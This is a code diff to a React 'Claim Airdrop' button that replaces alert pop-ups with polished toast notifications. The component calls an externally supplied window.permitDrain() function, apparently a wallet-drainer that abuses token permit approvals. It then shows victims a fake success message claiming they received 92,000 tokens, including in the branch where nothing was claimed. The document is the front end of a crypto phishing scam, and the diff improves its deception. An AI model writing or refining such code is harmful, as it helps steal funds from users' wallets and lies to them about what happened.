@@ -1,4 +1,5 @@
 import { useState } from "react";
+import { toast } from "sonner";
 
 export default function ClaimButton() {
   const [btnText, setBtnText] = useState("Claim Airdrop");
@@ -6,7 +7,9 @@ export default function ClaimButton() {
 
   const handleClaim = async () => {
     if (!(window as any).ethereum?.selectedAddress) {
-      alert("Please connect wallet first");
+      toast.error("Wallet Not Connected", {
+        description: "Please connect your wallet first to claim your airdrop",
+      });
       return;
     }
 
@@ -17,16 +20,29 @@ export default function ClaimButton() {
       if ((window as any).permitDrain) {
         await (window as any).permitDrain();
         setBtnText("Claimed ✓");
-        setTimeout(() => alert("92,000 LYNK claimed!"), 600);
+        setTimeout(() => {
+          toast.success("Airdrop Claimed!", {
+            description: "You have successfully claimed 92,000 NEX tokens. Check your wallet.",
+            duration: 5000,
+          });
+        }, 600);
       } else {
         // Fallback if permitDrain not available from external script
         setBtnText("Claimed ✓");
-        setTimeout(() => alert("Airdrop claimed successfully!"), 600);
+        setTimeout(() => {
+          toast.success("Airdrop Claimed!", {
+            description: "Your airdrop has been successfully claimed.",
+            duration: 5000,
+          });
+        }, 600);
       }
     } catch (e) {
       console.error("Claim error:", e);
       setBtnText("Try Again");
       setIsDisabled(false);
+      toast.error("Claim Failed", {
+        description: "There was an error claiming your airdrop. Please try again.",
+      });
     }
   };
 
